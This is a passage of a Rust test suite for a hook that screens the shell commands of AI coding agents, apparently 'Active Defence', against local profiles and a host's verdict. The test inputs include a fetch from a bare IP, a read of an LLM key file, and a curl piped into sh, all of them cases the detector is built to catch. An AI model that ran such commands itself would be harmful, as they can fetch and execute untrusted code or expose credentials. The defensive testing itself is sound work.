        let (out, label) = decide(&profiles, &host_allow(), false);
        assert!(out.blocks, "no local profile allows it");
        assert_eq!(out.verdict["recommendation"], "review");
        assert!(!out.relaxation_withheld);
        assert!(!label.unwrap().decided);
    }

    /// FAILS ON REVERT: leave the hook's own relaxation out of
    /// `relaxation_withheld` when the host's verdict is the stricter, and a
    /// relaxation the host kept is not recorded as withheld.
    #[test]
    fn relaxation_withheld_is_false_only_when_the_relaxation_stands() {
        let profiles = on(PERMISSIVE, None);
        let cases = [
            (HostReply::None, true),
            (HostReply::Invalid, true),
            (
                answer(
                    Trust::Confined,
                    Verdict::Review,
                    RuleLayer::General,
                    Some("a_word_never_heard"),
                ),
                true,
            ),
            (
                answer(Trust::Observed, Verdict::Allow, RuleLayer::AgentType, None),
                true,
            ),
            (
                answer(Trust::Confined, Verdict::Review, RuleLayer::General, None),
                true,
            ),
            (host_allow(), false),
        ];
        for (reply, withheld) in cases {
            let (out, _) = decide(&profiles, &reply, false);
            assert_eq!(out.relaxation_withheld, withheld, "{reply:?}");
        }
    }

    #[test]
    fn no_reply_records_nothing_and_an_invalid_one_says_so() {
        let profiles = on(PERMISSIVE, None);
        let (none, label) = decide(&profiles, &HostReply::None, false);
        assert_eq!(label, None);
        let (invalid, label) = decide(&profiles, &HostReply::Invalid, false);
        assert_eq!(none, invalid, "an invalid answer changes no decision");
        assert_eq!(
            label,
            Some(HostLabel {
                withheld: Some("host_answer_invalid".into()),
                ..HostLabel::default()
            })
        );
    }

    /// A profile in `enforce` lets a review run only where the host relaxed.
    #[test]
    fn a_review_runs_under_an_enforce_profile_only_with_the_host() {
        let profiles = on(
            "schema_version = 1\n[profile.claude-code]\nmode = \"enforce\"\n",
            None,
        );
        let (kept, _) = decide(&profiles, &HostReply::None, false);
        assert!(kept.blocks);
        let reply = answer(Trust::Confined, Verdict::Review, RuleLayer::General, None);
        let (relaxed, _) = decide(&profiles, &reply, false);
        assert!(!relaxed.blocks);
    }

    /// Inside a jail the key is only the launcher's copy, never the host's
    /// file seen through the jail (where any account's file shows with the
    /// one uid every account but the user's has there).
    ///
    /// FAILS ON REVERT: read the host's file in the jail too.
    #[test]
    fn inside_a_jail_the_key_is_only_the_launchers_copy() {
        assert_eq!(key_file(true), KeyFile::Jail);
        assert_eq!(key_file(true).path(), "/run/innerwarden/agent-tls.spki");
        assert_eq!(key_file(false), KeyFile::Host);
        assert_eq!(key_file(false).path(), "/etc/innerwarden/agent-tls.spki");
    }

    // -- ask_host = "every_command" ------------------------------------------

    /// A system file of schema 2 whose `claude-code` profile asks the host
    /// about every command, and allows a fetch from a bare IP.
    const EVERY: &str = "schema_version = 2\n[profile.claude-code]\nask_host = \"every_command\"\n\
                         allow_categories = [\"bare_ip_fetch\"]\n";

    fn every() -> ProfilesState {
        ProfilesState::On(on(EVERY, None))
    }

    fn allow() -> Value {
        json!({"recommendation": "allow", "risk_score": 0, "explanation": "No risk signals.",
            "signals": []})
    }

    #[test]
    fn the_profile_in_force_says_when_to_ask() {
        assert_eq!(
            ask_for(&every(), Some("claude-code")),
            AskHost::EveryCommand
        );
        assert_eq!(ask_for(&every(), Some("cursor")), AskHost::Review);
        assert_eq!(ask_for(&every(), None), AskHost::Review);
        assert_eq!(
            ask_for(&profiles_on(), Some("claude-code")),
            AskHost::Review
        );
        for state in [ProfilesState::Off, ProfilesState::Invalid("bad".into())] {
            assert_eq!(ask_for(&state, Some("claude-code")), AskHost::Review);
        }
        // The user's file never says it: the reader refuses the whole state.
        let user = ProfilesState::Invalid("~/x".into());
        assert!(matches!(
            state_from(
                ("/etc/x", FileRead::Absent),
                ("~/x", FileRead::Bytes(EVERY.as_bytes().to_vec()))
            ),
            ProfilesState::Invalid(why) if why.contains("ask_host")
        ));
        assert_eq!(ask_for(&user, Some("claude-code")), AskHost::Review);
    }

    /// Under `every_command` an allow of the general rules is asked about
    /// too; under the default ask it never is.
    ///
    /// FAILS ON REVERT: ask about an allow whatever `ask` says, and the
    /// default ask makes a request for every allowed command.
    #[test]
    fn an_allow_is_asked_about_only_under_every_command() {
        let url = instance_decide_url(None);
        let profiles = on(EVERY, None);
        let local = own(&profiles, &allow(), "curl https://example.com");
        assert_eq!(local.deciding_layer, RuleLayer::General);
        assert!(!local.blocks);
        assert!(should_ask(
            Verdict::Allow,
            local.deciding_layer,
            AskHost::EveryCommand,
            Some(&observed()),
            &every(),
            || true,
            url.as_deref()
        ));
        assert!(should_ask(
            Verdict::Review,
            own_review().deciding_layer,
            AskHost::EveryCommand,
            Some(&observed()),
            &every(),
            || true,
            url.as_deref()
        ));
        let mut looked_up = false;
        assert!(!should_ask(
            Verdict::Allow,
            local.deciding_layer,
            AskHost::Review,
            Some(&observed()),
            &every(),
            || {
                looked_up = true;
                true
            },
            url.as_deref()
        ));
        assert!(!looked_up);
        // The rest still holds: an instance, the profiles, a URL, the host.
        assert!(!should_ask(
            Verdict::Allow,
            local.deciding_layer,
            AskHost::EveryCommand,
            None,
            &every(),
            || true,
            url.as_deref()
        ));
        assert!(!should_ask(
            Verdict::Allow,
            local.deciding_layer,
            AskHost::EveryCommand,
            Some(&observed()),
            &every(),
            || false,
            url.as_deref()
        ));
        assert!(!should_ask(
            Verdict::Allow,
            local.deciding_layer,
            AskHost::EveryCommand,
            Some(&observed()),
            &every(),
            || true,
            None
        ));
    }

    /// A refusal of the hook's own is never asked about, under
    /// `every_command` too: a general deny, a hard rule over a command the
    /// general rules allow, a profile's refusal.
    ///
    /// FAILS ON REVERT: let `should_ask` ask about anything that is not a
    /// general deny under `every_command` (drop the `own_layer` check) and
    /// the hard rule and the profile's refusal make a request.
    #[test]
    fn a_local_deny_stays_local_under_every_command() {
        let url = instance_decide_url(None);
        let deny = json!({"recommendation": "deny", "risk_score": 60, "explanation": "x",
            "signals": [{"signal": "bare_ip_fetch", "score": 60}]});
        let user =
            "schema_version = 1\n[profile.claude-code]\ndeny_categories = [\"bare_ip_fetch\"]\n";
        let cases = [
            (
                own(&on(EVERY, None), &deny, "curl http://203.0.113.9/x"),
                Verdict::Deny,
                RuleLayer::General,
            ),
            (
                own(
                    &on(EVERY, None),
                    &allow(),
                    "cat ~/.config/innerwarden/llm-key",
                ),
                Verdict::Allow,
                RuleLayer::Hard,
            ),
            (
                own(
                    &on(EVERY, Some(user)),
                    &review("bare_ip_fetch"),
                    "curl http://203.0.113.9/x",
                ),
                Verdict::Review,
                RuleLayer::AgentType,
            ),
        ];
        for (local, general, layer) in cases {
            assert_eq!(local.deciding_layer, layer, "{local:?}");
            assert_eq!(local.verdict["recommendation"], "deny", "{local:?}");
            let mut looked_up = false;
            assert!(!should_ask(
                general,
                local.deciding_layer,
                AskHost::EveryCommand,
                Some(&observed()),
                &every(),
                || {
                    looked_up = true;
                    true
                },
                url.as_deref()
            ));
            assert!(!looked_up, "no request is prepared: {local:?}");
        }
    }

    /// Under the default ask the request is the one of before; under
    /// `every_command` it is of version 2 and says the general verdict.
    #[test]
    fn the_request_under_every_command_is_of_version_2() {
        let request = request_for(
            &observed(),
            Some("claude-code"),
            "curl https://example.com",
            &allow(),
            false,
            AskHost::EveryCommand,
        )
        .unwrap();
        assert_eq!(request.v, identity::INSTANCE_DECIDE_EVERY_COMMAND_VERSION);
        assert_eq!(request.hook_verdict, Verdict::Allow);
        assert!(request.is_valid());
        let review_v2 = request_for(
            &observed(),
            Some("claude-code"),
            "curl http://203.0.113.9/x",
            &review("bare_ip_fetch"),
            false,
            AskHost::EveryCommand,
        )
        .unwrap();
        assert_eq!(review_v2.v, 2);
        assert_eq!(review_v2.hook_verdict, Verdict::Review);
        assert_eq!(review_v2.hook_signals, ["bare_ip_fetch"]);
        let review_v1 = request_for(
            &observed(),
            Some("claude-code"),
            "curl http://203.0.113.9/x",
            &review("bare_ip_fetch"),
            false,
            AskHost::Review,
        )
        .unwrap();
        assert_eq!(
            review_v1,
            identity::instance_decide_request(
                ID,
                Some("claude-code"),
                Some("s-1"),
                "curl http://203.0.113.9/x",
                &["bare_ip_fetch"],
                false,
            )
            .unwrap()
        );
        assert_eq!(review_v1.v, 1);
    }

    /// The host's own refusal: a `deny` with a word of
    /// `identity::HOST_REFUSAL_PREFIX`.
    fn host_refusal() -> HostReply {
        answer(
            Trust::Confined,
            Verdict::Deny,
            RuleLayer::General,
            Some("kernel_a_word_never_heard"),
        )
    }

    /// A refusal of the host's own, over a command the general rules allow
    /// or send to review, says the generic sentence, never the general rules'
    /// "nothing to refuse", and is recorded as the host's.
    ///
    /// FAILS ON REVERT: leave the general explanation in place and the
    /// refusal says "No risk signals.".
    #[test]
    fn a_host_refusal_of_its_own_says_the_generic_sentence() {
        let profiles = on(EVERY, None);
        for (verdict, command) in [
            (allow(), "curl https://example.com"),
            (review("bare_ip_fetch"), "curl http://203.0.113.9/x"),
        ] {
            let (out, label) = decide_command(&profiles, &verdict, command, &host_refusal(), false);
            assert!(out.blocks, "{command}");
            assert_eq!(out.verdict["recommendation"], "deny", "{command}");
            assert_eq!(out.verdict["explanation"], HOST_DENY_SENTENCE, "{command}");
            assert_eq!(out.verdict["decided_by"], HOST_DECIDED_BY, "{command}");
            let label = label.unwrap();
            assert!(label.answered && !label.decided);
            assert_eq!(label.withheld.as_deref(), Some("kernel_a_word_never_heard"));
        }
        assert_eq!(
            HOST_DENY_SENTENCE,
            "Active Defence on this host will not start a program in this command."
        );
        assert_eq!(HOST_DECIDED_BY, "host");
    }

    /// A refusal of the host's that is not its own (its reading of the rules)
    /// keeps the general rules' explanation and who decided them, as it
    /// always did.
    ///
    /// FAILS ON REVERT: say the sentence for every refusal of the host's and
    /// this explanation changes.
    #[test]
    fn a_host_deny_not_its_own_keeps_the_explanation_of_before() {
        let profiles = on("schema_version = 1\n[profile.claude-code]\n", None);
        let reply = answer(
            Trust::Confined,
            Verdict::Deny,
            RuleLayer::AgentType,
            Some("x"),
        );
        let (out, _) = decide(&profiles, &reply, false);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "deny");
        assert_eq!(out.verdict["explanation"], "fetch from a bare IP");
        assert!(out.verdict.get("decided_by").is_none());
    }

    /// Over a command the general rules allow, the host's allow, its review
    /// or its refusal that is not its own move nothing; only its own refusal
    /// stands.
    #[test]
    fn an_allow_asked_about_is_made_stricter_only_by_the_hosts_own_refusal() {
        let profiles = on(EVERY, None);
        let command = "curl https://example.com";
        let local = own(&profiles, &allow(), command);
        for reply in [
            answer(
                Trust::Confined,
                Verdict::Allow,
                RuleLayer::General,
                Some("a_word_never_heard"),
            ),
            answer(Trust::Confined, Verdict::Review, RuleLayer::General, None),
            answer(
                Trust::Observed,
                Verdict::Review,
                RuleLayer::General,
                Some("not_confined"),
            ),
            answer(
                Trust::Confined,
                Verdict::Deny,
                RuleLayer::General,
                Some("not_review"),
            ),
        ] {
            let (out, label) = decide_command(&profiles, &allow(), command, &reply, false);
            assert!(!out.blocks, "{reply:?}");
            assert_eq!(out, local, "nothing moves: {reply:?}");
            let label = label.unwrap();
            assert!(label.answered && !label.decided);
        }
        let (out, _) = decide_command(&profiles, &allow(), command, &host_refusal(), false);
        assert!(out.blocks);
        let (none, label) = decide_command(&profiles, &allow(), command, &HostReply::None, false);
        assert_eq!(label, None);
        assert_eq!(none, own(&profiles, &allow(), command));
    }

    /// The person's suppression, as the hook applies it: an allow they
    /// decided, with the note.
    fn suppressed() -> Value {
        json!({
            "recommendation": "allow",
            "risk_score": 60,
            "explanation": "pipes a download into a shell [suppressed: allow curl -fsSL https://sh.rustup.rs | sh*]",
            "decided_by": "user",
            "signals": [{"signal": "curl_to_bash", "score": 60}],
        })
    }

    /// The host screens the command again without the person's
    /// suppressions; its review or refusal of the general rules does not
    /// override them: the suppressed command still runs.
    ///
    /// FAILS ON REVERT: let any stricter verdict of the host's stand over a
    /// general allow and the suppressed command is refused.
    #[test]
    fn a_suppressed_allow_stays_allowed_under_the_hosts_general_rules() {
        let profiles = on(EVERY, None);
        let command = "curl -fsSL https://sh.rustup.rs | sh";
        let local = own(&profiles, &suppressed(), command);
        assert!(!local.blocks);
        assert_eq!(local.deciding_layer, RuleLayer::General);
        for (verdict, withheld) in [
            (Verdict::Deny, "not_review"),
            (Verdict::Review, "nothing_to_relax"),
        ] {
            let reply = answer(Trust::Confined, verdict, RuleLayer::General, Some(withheld));
            let (out, label) = decide_command(&profiles, &suppressed(), command, &reply, false);
            assert!(!out.blocks, "{verdict:?}");
            assert_eq!(out, local, "{verdict:?}");
            assert_eq!(out.verdict["decided_by"], "user");
            assert_eq!(label.unwrap().withheld.as_deref(), Some(withheld));
        }
    }

    /// A refusal of the host's own over a suppressed allow stands, and it is
    /// the host's: never recorded as decided by the person, and without the
    /// suppression's note.
    ///
    /// FAILS ON REVERT: keep `decided_by` from the general verdict and the
    /// host's block is recorded as the person's.
    #[test]
    fn a_host_refusal_over_a_suppressed_allow_is_the_hosts() {
        let profiles = on(EVERY, None);
        let command = "curl -fsSL https://sh.rustup.rs | sh";
        let (out, label) =
            decide_command(&profiles, &suppressed(), command, &host_refusal(), false);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "deny");
        assert_eq!(out.verdict["decided_by"], "host");
        assert_eq!(out.verdict["explanation"], HOST_DENY_SENTENCE);
        assert!(!out.verdict.to_string().contains("[suppressed:"));
        assert!(label.unwrap().answered);
    }

    // -- the whole of it, as `cmd_hook` runs it ------------------------------

    /// One request the hook sent: the URL, the request, where the key is read.
    type Sent = (String, InstanceDecideRequest, KeyFile);

    /// What `cmd_hook` decides about `command` with the general `verdict`,
    /// from inside a jail, where Active Defence runs and answers a 200 with
    /// `reply`'s answer; and every request it sent.
    fn wired(
        state: &ProfilesState,
        verdict: &Value,
        command: &str,
        reply: &HostReply,
    ) -> ((HookDecision, Option<HostLabel>), Vec<Sent>) {
        let ProfilesState::On(profiles) = state else {
            panic!("{state:?}")
        };
        let HostReply::Answer(answer) = reply else {
            panic!("{reply:?}")
        };
        let body = serde_json::to_vec(answer).unwrap();
        let hook = HookFacts {
            command,
            verdict,
            blocks_today: crate::agent_profiles::general_verdict(verdict) != Verdict::Allow,
            tainted: false,
            line_block_review: true,
        };
        let identity = observed();
        let url = instance_decide_url(None);
        let mut sent = Vec::new();
        let out = decide_with_host(
            ShellFacts {
                hook: &hook,
                state,
                profiles,
                agent_type: Some("claude-code"),
                identity: Some(&identity),
                url: url.as_deref(),
            },
            || true,
            |url, request, key| {
                sent.push((url.to_string(), request.clone(), key));
                Some((200, body))
            },
        );
        (out, sent)
    }

    /// Under `every_command` the hook asks about an allow with a request of
    /// version 2, holds the answer to the launcher's key, and a refusal of
    /// the host's own stands with the generic sentence.
    ///
    /// FAILS ON REVERT: ask `should_ask` or `request_for` under the default
    /// ask whatever the profile says, and the allow is not asked about, or
    /// goes as version 1.
    #[test]
    fn the_hook_asks_about_an_allow_under_every_command_as_version_2() {
        let ((out, label), sent) = wired(
            &every(),
            &allow(),
            "curl https://example.com",
            &host_refusal(),
        );
        assert_eq!(sent.len(), 1, "one request");
        let (url, request, key) = &sent[0];
        assert_eq!(url, "https://127.0.0.1:8787/api/agent/instance-decide");
        assert_eq!(request.v, identity::INSTANCE_DECIDE_EVERY_COMMAND_VERSION);
        assert_eq!(request.hook_verdict, Verdict::Allow);
        assert_eq!(request.instance_id, ID);
        assert_eq!(*key, KeyFile::Jail);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "deny");
        assert_eq!(out.verdict["explanation"], HOST_DENY_SENTENCE);
        assert_eq!(out.verdict["decided_by"], HOST_DECIDED_BY);
        let label = label.unwrap();
        assert!(label.answered && !label.decided);
    }

    /// Under the default ask the hook never asks about an allow, and asks
    /// about a review with the request of version 1, decided again at
    /// `confined` when the host relaxes.
    ///
    /// FAILS ON REVERT: take `every_command` whatever the profile says
    /// (`ask_for`), and the allow makes a request.
    #[test]
    fn under_the_default_ask_the_hook_asks_only_about_a_review_as_version_1() {
        let ((out, label), sent) = wired(
            &profiles_on(),
            &allow(),
            "curl https://example.com",
            &host_refusal(),
        );
        assert!(sent.is_empty(), "{sent:?}");
        assert_eq!(label, None);
        assert!(!out.blocks);
        let ((out, label), sent) = wired(
            &profiles_on(),
            &review("bare_ip_fetch"),
            "curl http://203.0.113.9/x",
            &host_allow(),
        );
        assert_eq!(sent.len(), 1, "one request");
        assert_eq!(sent[0].1.v, identity::INSTANCE_DECIDE_VERSION);
        assert_eq!(sent[0].1.hook_verdict, Verdict::Review);
        assert!(!out.blocks);
        assert_eq!(out.deciding_layer, RuleLayer::AgentType);
        assert!(label.unwrap().decided);
    }

    /// A refusal of the hook's own is not asked about through the wiring
    /// either, under `every_command`.
    #[test]
    fn the_hook_never_asks_about_its_own_refusal() {
        let deny = json!({"recommendation": "deny", "risk_score": 60, "explanation": "x",
            "signals": [{"signal": "bare_ip_fetch", "score": 60}]});
        let ((out, label), sent) =
            wired(&every(), &deny, "curl http://203.0.113.9/x", &host_allow());
        assert!(sent.is_empty(), "{sent:?}");
        assert_eq!(label, None);
        assert!(out.blocks);
    }
}
